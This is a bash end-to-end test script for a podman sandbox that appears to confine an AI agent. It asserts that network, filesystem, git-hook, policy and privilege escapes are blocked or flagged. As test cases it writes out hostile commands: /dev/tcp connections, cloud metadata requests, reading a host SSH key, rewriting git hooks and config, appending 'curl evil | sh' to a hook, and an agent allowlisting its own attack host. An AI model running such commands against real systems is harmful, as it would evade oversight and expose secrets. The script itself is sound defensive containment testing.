#!/usr/bin/env bash
# Asserts every isolation condition of a podbox sandbox against real podman.
# Exits non-zero on any escape. Env: PODBOX (binary), E2E_ALLOWED_HOST,
# E2E_EXTRA_HOST (reachable but not allowlisted by default), E2E_ATTACK_HOST
# (a host the agent tries to allowlist itself).
. "$(dirname "$0")/lib.sh"

ALLOWED=${E2E_ALLOWED_HOST:-registry.npmjs.org}
EXTRA=${E2E_EXTRA_HOST:-proxy.golang.org}
ATTACK=${E2E_ATTACK_HOST:-example.com}
NAME=e2e
UPNAME=e2e-up
MVNAME=e2e-mv
HKNAME=e2e-hooks
UPSTREAM_CTR=podbox-e2e-upstream
WORK=$(mktemp -d)
PROJ=$WORK/project
HOSTDIR=$WORK/host-home

cleanup() {
	[ -n "${LOOP_PID:-}" ] && kill "$LOOP_PID" 2>/dev/null
	podman rm -f -t 0 "$UPSTREAM_CTR" >/dev/null 2>&1
	pb rm "$UPNAME" >/dev/null 2>&1
	pb rm "$MVNAME" >/dev/null 2>&1
	pb rm "$HKNAME" >/dev/null 2>&1
	pb rm e2e-home >/dev/null 2>&1
	pb rm "$NAME" --volumes >/dev/null 2>&1
	rm -rf "$WORK" "$PODBOX_HOME"
}
trap cleanup EXIT

# Fixtures: a project with secrets, a fake host ~/.ssh, a host loopback service.
mkdir -p "$PROJ/.ssh" "$PROJ/src" "$HOSTDIR/.ssh"
git init -q "$PROJ" && rm -rf "$PROJ/.git/hooks" && mkdir "$PROJ/.git/hooks"
echo 'API_KEY=leaked' >"$PROJ/.env"
echo 'key' >"$PROJ/.ssh/id_project"
printf '#!/bin/sh\necho ran >"$(git rev-parse --show-toplevel)/.hook-ran"\n' >"$PROJ/.git/hooks/pre-commit"
chmod +x "$PROJ/.git/hooks/pre-commit"
echo 'hello' >"$PROJ/src/readme.txt"
echo 'private notes' >"$PROJ/notes.txt"
echo 'notes.txt' >"$PROJ/.sandboxignore"
echo 'host-private-key' >"$HOSTDIR/.ssh/id_e2e"
LOOP_PORT=$((20000 + RANDOM % 10000))
python3 -m http.server "$LOOP_PORT" --bind 127.0.0.1 --directory "$HOSTDIR" >/dev/null 2>&1 &
LOOP_PID=$!

echo "== setup"
pb image build proxy shell >/dev/null || { echo "image build failed"; exit 1; }
pb create shell "$PROJ" --name "$NAME" >/dev/null && pb start "$NAME" >/dev/null || { echo "sandbox setup failed"; exit 1; }
check "host loopback service is up" eventually 5 curl -sf --noproxy '*' "http://127.0.0.1:$LOOP_PORT/"

refused() { ! sx "$1" "curl -sf --max-time 10 $2"; }
upstream_saw() { podman logs "$UPSTREAM_CTR" 2>/dev/null | grep -q "\"host\":\"$1\".*\"decision\":\"allow\""; }
curl_code() { sx "$1" "curl -s -o /dev/null -w '%{http_code}' --max-time 15 $2"; }
reached() { local c; c=$(curl_code "$1" "$2"); [ "$c" -ge 200 ] && [ "$c" -lt 500 ] && [ "$c" != 403 ]; }

echo "== allowed egress"
check "allowed host $ALLOWED answers through the proxy" reached "$NAME" "https://$ALLOWED/"

echo "== network escapes"
blocked "direct IP egress (1.1.1.1:443)" sx "$NAME" "curl -sS --noproxy '*' --max-time 5 https://1.1.1.1/"
blocked "direct TCP to 8.8.8.8:53" sx "$NAME" "timeout 5 bash -c 'exec 3<>/dev/tcp/8.8.8.8/53'"
blocked "external DNS resolution" sx "$NAME" "getent hosts example.com"
blocked "DNS name without proxy" sx "$NAME" "curl -sS --noproxy '*' --max-time 5 https://$ALLOWED/"
for target in "host.containers.internal" "169.254.1.2" "10.0.2.2" "127.0.0.1"; do
	blocked "host loopback service via $target" sx "$NAME" "curl -sf --noproxy '*' --max-time 5 http://$target:$LOOP_PORT/"
done
blocked "default route present" sx "$NAME" "awk '\$2 == \"00000000\" {found=1} END {exit !found}' /proc/net/route"
blocked "host loopback through the proxy (127.0.0.1)" sx "$NAME" "curl -sf --max-time 5 http://127.0.0.1:$LOOP_PORT/"
blocked "host service through the proxy (host.containers.internal)" sx "$NAME" "curl -sf --max-time 5 http://host.containers.internal:$LOOP_PORT/"
blocked "cloud metadata through the proxy" sx "$NAME" "curl -sf --max-time 5 http://169.254.169.254/latest/meta-data/"
blocked "host proxy variable inherited" sx "$NAME" "env | grep -iE '^(https?|no|all)_proxy=' | grep -vE '=(http://proxy:3128|localhost,127.0.0.1)\$' | grep -q ."

echo "== filesystem escapes"
blocked "read host ~/.ssh ($HOSTDIR/.ssh/id_e2e)" sx "$NAME" "cat '$HOSTDIR/.ssh/id_e2e'"
check "project .env is empty" sx "$NAME" "[ ! -s '$PROJ/.env' ]"
check "project .ssh/ is empty" sx "$NAME" "[ -z \"\$(ls -A '$PROJ/.ssh')\" ]"
HOOK=$(sha256sum <"$PROJ/.git/hooks/pre-commit")
check "project .git/hooks/pre-commit visible" sx "$NAME" "grep -q hook-ran '$PROJ/.git/hooks/pre-commit'"
blocked "agent adds a hook" sx "$NAME" "touch '$PROJ/.git/hooks/post-checkout'"
blocked "agent writes .git/hooks/pre-commit" sx "$NAME" "echo 'echo pwned' >>'$PROJ/.git/hooks/pre-commit'"
blocked "agent replaces .git/hooks/pre-commit" sx "$NAME" "printf 'echo pwned' >/tmp/h && mv -f /tmp/h '$PROJ/.git/hooks/pre-commit'"
blocked "agent renames .git/hooks" sx "$NAME" "mv '$PROJ/.git/hooks' '$PROJ/.git/hooks-old'"
check ".git/hooks/pre-commit unchanged on the host" test "$(sha256sum <"$PROJ/.git/hooks/pre-commit")" = "$HOOK"
check "masked files intact on the host" grep -q leaked "$PROJ/.env"
check "project files readable and writable" sx "$NAME" "grep -q hello '$PROJ/src/readme.txt' && echo agent >'$PROJ/src/out.txt'"
check "agent writes are owned by the host user" test "$(stat -c %u "$PROJ/src/out.txt")" = "$(id -u)"
blocked "podman or docker socket reachable" sx "$NAME" "find / \( -path /proc -o -path /sys \) -prune -o -type s -print 2>/dev/null | grep -q ."
blocked "container engine binary available" sx "$NAME" "command -v podman || command -v docker"

echo "== git configuration"
GITCFG=$(sha256sum <"$PROJ/.git/config")
blocked "agent sets core.hooksPath" sx "$NAME" "git config core.hooksPath /tmp/x"
blocked "agent appends to .git/config" sx "$NAME" "echo '[core] fsmonitor = /tmp/x' >>'$PROJ/.git/config'"
blocked "agent replaces .git/config" sx "$NAME" "cp '$PROJ/.git/config' /tmp/c && mv -f /tmp/c '$PROJ/.git/config'"
blocked "agent renames .git to plant its own" sx "$NAME" "mv -f '$PROJ/.git' '$PROJ/.git-old'"
check ".git/config unchanged on the host" test "$(sha256sum <"$PROJ/.git/config")" = "$GITCFG"
check "git commit still works in the sandbox" sx "$NAME" "git add src/readme.txt && GIT_AUTHOR_NAME=a GIT_AUTHOR_EMAIL=a@e2e GIT_COMMITTER_NAME=a GIT_COMMITTER_EMAIL=a@e2e git commit -qm agent"
check "agent commit visible on the host" test "$(git -C "$PROJ" log -1 --format=%s 2>/dev/null)" = agent
check "project pre-commit hook ran for the agent's commit" test -f "$PROJ/.hook-ran"

echo "== git directory integrity"
GITENV="GIT_AUTHOR_NAME=a GIT_AUTHOR_EMAIL=a@e2e GIT_COMMITTER_NAME=a GIT_COMMITTER_EMAIL=a@e2e"
tampering() { grep -q "GIT DIRECTORY TAMPERING SUSPECTED" <<<"$1"; }
commit_quiet() { local err; err=$(sx "$NAME" "echo more >>src/readme.txt && git checkout -qb e2e-branch && $GITENV git commit -qam agent2" 2>&1 >/dev/null) || return 1; ! tampering "$err"; }
git_check_code() { pb git-check "$NAME" >/dev/null 2>&1; echo $?; }
ls_tampering() { tampering "$(pb ls 2>&1 >/dev/null)"; }
ls_json_flags() { pb ls -o json 2>/dev/null | jq -e ".[] | select(.name == \"$NAME\") | .git_integrity.ok == false and (.git_integrity.findings[0].path == \".git/commondir\")" >/dev/null; }
check "normal commit and branch in the sandbox print no git warning" commit_quiet
blocked "ls warns after a normal commit" ls_tampering
check "git-check exits 0 after a normal commit" test "$(git_check_code)" = 0
check "agent writes .git/commondir" sx "$NAME" "echo /tmp/evil >'$PROJ/.git/commondir'"
check "ls warns about .git/commondir" ls_tampering
check "ls JSON reports git_integrity.ok false with the path" ls_json_flags
check "git-check exits 6" test "$(git_check_code)" = 6
stop_out=$(pb stop "$NAME" -o json 2>"$WORK/stop.err")
check "stop warns about .git/commondir" tampering "$(cat "$WORK/stop.err")"
check "stop JSON reports git_integrity.ok false" jq -e '.git_integrity.ok == false' >/dev/null <<<"$stop_out"
rm -f "$PROJ/.git/commondir"
check "git-check --accept re-records" sh -c "'$PODBOX' git-check '$NAME' --accept >/dev/null"
check "git-check exits 0 after removal and accept" test "$(git_check_code)" = 0
blocked "ls warns after accept" ls_tampering
pb start "$NAME" >/dev/null 2>&1

echo "== worktree hook files"
HK=$WORK/hooked
git init -q "$HK" && rm -rf "$HK/.git/hooks"
mkdir -p "$HK/.husky" && echo 'npm test' >"$HK/.husky/pre-commit"
hook_info() { grep -q "info: $HKNAME: this project runs code from .husky/ on your commits" <<<"$1"; }
hk_check() { pb git-check "$HKNAME" >"$WORK/hk.out" 2>&1; echo $?; }
create_json=$(pb create shell "$HK" --name "$HKNAME" -o json 2>"$WORK/hk.err")
check "create prints the hook info line" hook_info "$(cat "$WORK/hk.err")"
check "create JSON carries the hook info" jq -e '.info | test("runs code from .husky/")' >/dev/null <<<"$create_json"
check "start prints the hook info line" hook_info "$(pb start "$HKNAME" 2>&1 >/dev/null)"
blocked "launch without hook files prints the info line" sh -c "'$PODBOX' start '$NAME' 2>&1 | grep -q 'runs code from'"
check "absent .git/hooks not created on the host" test ! -e "$HK/.git/hooks"
check "agent edits .husky/pre-commit" sx "$HKNAME" "echo 'curl evil | sh' >>.husky/pre-commit"
check "git-check exits 6 on the hook edit" test "$(hk_check)" = 6
check "git-check lists .husky/pre-commit" grep -q "GIT HOOK FILES CHANGED" "$WORK/hk.out"
check "git-check names .husky/pre-commit" grep -q "  .husky/pre-commit: changed" "$WORK/hk.out"
pb git-check "$HKNAME" --accept >/dev/null 2>&1
check "git-check exits 0 after accept" test "$(hk_check)" = 0
check "agent creates .git/hooks/ (absent at start)" sx "$HKNAME" "mkdir .git/hooks && printf '#!/bin/sh\n' >.git/hooks/post-commit"
check "git-check exits 6 on the created hook" test "$(hk_check)" = 6
check "git-check names .git/hooks/post-commit" grep -q "  .git/hooks/post-commit: appeared" "$WORK/hk.out"
pb rm "$HKNAME" >/dev/null 2>&1

echo "== refused workspaces"
refused_usage() { local err; err=$("$@" 2>&1 >/dev/null); [ $? -eq 2 ] && grep -q "unsafe workspace" <<<"$err"; }
mkdir -p "$WORK/fakehome"
check "workspace containing PODBOX_HOME refused (exit 2)" refused_usage env PODBOX_HOME="$WORK/fakehome/.podbox" "$PODBOX" create shell "$WORK/fakehome" --name e2e-home
check "home directory refused (exit 2)" refused_usage pb create shell "$HOME" --name e2e-home
check "workspace inside PODBOX_HOME refused (exit 2)" refused_usage pb create shell "$PODBOX_HOME" --name e2e-home
mkdir -p "$WORK/moved"
pb create shell "$WORK/moved" --name "$MVNAME" >/dev/null 2>&1
rmdir "$WORK/moved" && ln -s "$PODBOX_HOME" "$WORK/moved"
check "start refuses a workspace now resolving to PODBOX_HOME (exit 2)" refused_usage pb start "$MVNAME"
pb rm "$MVNAME" >/dev/null 2>&1

echo "== privileges"
check "uid 1000" test "$(sx "$NAME" 'id -u')" = 1000
check "no effective capabilities" test "$(sx "$NAME" "awk '/^CapEff/ {print \$2}' /proc/self/status")" = 0000000000000000
check "no_new_privs set" test "$(sx "$NAME" "awk '/^NoNewPrivs/ {print \$2}' /proc/self/status")" = 1

echo "== allowlist and hot reload"
body=$(sx "$NAME" "curl -s --max-time 10 http://$EXTRA/")
check "non-allowlisted host gets the readable refusal" grep -q "Ask the user to run: podbox policy allow $NAME $EXTRA" <<<"$body"
blocked "non-allowlisted host over TLS" sx "$NAME" "curl -sf --max-time 10 https://$EXTRA/"
pb policy allow "$NAME" "$EXTRA" >/dev/null
check "allowed after policy allow, without restart" eventually 5 reached "$NAME" "https://$EXTRA/"
pb policy deny "$NAME" "$EXTRA" >/dev/null
check "refused again after policy deny" eventually 5 refused "$NAME" "https://$EXTRA/"

echo "== project policy and .sandboxignore tampering"
# Asserts on the proxy's own decision log: an outer firewall may refuse hosts too.
proxy_log() { podman logs "podbox-$NAME-proxy" 2>&1 | grep "\"host\":\"$ATTACK\""; }
probe() { sx "$NAME" "curl -s -o /dev/null --max-time 10 http://$ATTACK/"; }
denied_only() { probe; proxy_log | grep -q '"decision":"deny"' && ! proxy_log | grep -q '"decision":"allow"'; }
allowed_by_project() { probe; proxy_log | grep '"decision":"allow"' | grep -q '"layer":"project"'; }
ls_warns() { pb ls 2>&1 >/dev/null | grep -q "policy reload $NAME"; }
reload_shows() { grep -qF -- "$1" <<<"$reload_out"; }
check ".sandboxignore pattern is masked" sx "$NAME" "[ ! -s '$PROJ/notes.txt' ]"
blocked "agent edits .sandboxignore" sx "$NAME" "echo >'$PROJ/.sandboxignore'"
blocked "agent removes .sandboxignore" sx "$NAME" "rm -f '$PROJ/.sandboxignore'"
check "agent writes .podbox/policy.yaml (absent at creation)" sx "$NAME" "mkdir -p '$PROJ/.podbox' && printf 'rules:\n  - host: $ATTACK\n    allow: true\n' >'$PROJ/.podbox/policy.yaml'"
: >"$PROJ/.sandboxignore" # the tampering a read-only mount prevents, done from the host
check "ls warns that project files changed" ls_warns
pb policy allow "$NAME" example.org >/dev/null && pb stop "$NAME" >/dev/null && pb start "$NAME" >/dev/null 2>&1
check "self-allowlisted host denied after policy allow + stop/start" denied_only
check "removed .sandboxignore pattern still masked after stop/start" sx "$NAME" "[ ! -s '$PROJ/notes.txt' ]"
blocked "agent edits .podbox/ once it exists" sx "$NAME" "echo x >>'$PROJ/.podbox/policy.yaml'"
reload_out=$(pb policy reload "$NAME" 2>/dev/null)
check "policy reload shows the added rule" reload_shows "+ rule allow $ATTACK"
check "policy reload shows the removed pattern" reload_shows "- ignore notes.txt"
check "reloaded project rule applies without restart" eventually 10 allowed_by_project
rm -rf "$PROJ/.podbox" && echo 'notes.txt' >"$PROJ/.sandboxignore"
pb policy reload "$NAME" >/dev/null 2>&1
blocked "ls still warns after reload" ls_warns

echo "== corporate upstream proxy (allow-all, basic auth)"
PROXY_IMG=$(pb image ls -o json | jq -r '[.[] | select(.image == "proxy")][0].ref')
HOST_UPSTREAM=${HTTPS_PROXY:-${https_proxy:-}}
podman run -d --name "$UPSTREAM_CTR" --network podbox-egress --http-proxy=false \
	-e PODBOX_PROXY_AUTH=e2e:s3cret ${HOST_UPSTREAM:+-e PODBOX_UPSTREAM_PROXY=$HOST_UPSTREAM} \
	"$PROXY_IMG" --listen :3128 --allow-all >/dev/null
mkdir -p "$PODBOX_HOME/config"
printf 'upstream_proxy: http://e2e:s3cret@%s:3128\n' "$UPSTREAM_CTR" >"$PODBOX_HOME/config/config.yaml"
pb create shell "$PROJ" --name "$UPNAME" >/dev/null 2>&1 && pb start "$UPNAME" >/dev/null 2>&1
check "allowed host answers through the upstream" reached "$UPNAME" "https://$ALLOWED/"
check "upstream saw the request" eventually 5 upstream_saw "$ALLOWED"
check "refusal unchanged behind the upstream" grep -q "podbox policy allow $UPNAME $EXTRA" <<<"$(sx "$UPNAME" "curl -s --max-time 10 http://$EXTRA/")"
blocked "agent sees upstream credentials" sx "$UPNAME" "env | grep -q s3cret"
blocked "agent reaches the upstream directly" sx "$UPNAME" "curl -sf --noproxy '*' --max-time 5 -x http://e2e:s3cret@$UPSTREAM_CTR:3128 https://$ALLOWED/"
pb rm "$UPNAME" >/dev/null
podman rm -f -t 0 "$UPSTREAM_CTR" >/dev/null

echo "== teardown"
check "rm --volumes" pb rm "$NAME" --volumes
check "no labelled podman object left" no_objects_left
check "home volume removed" sh -c "! podman volume exists podbox-home-shell"

summary
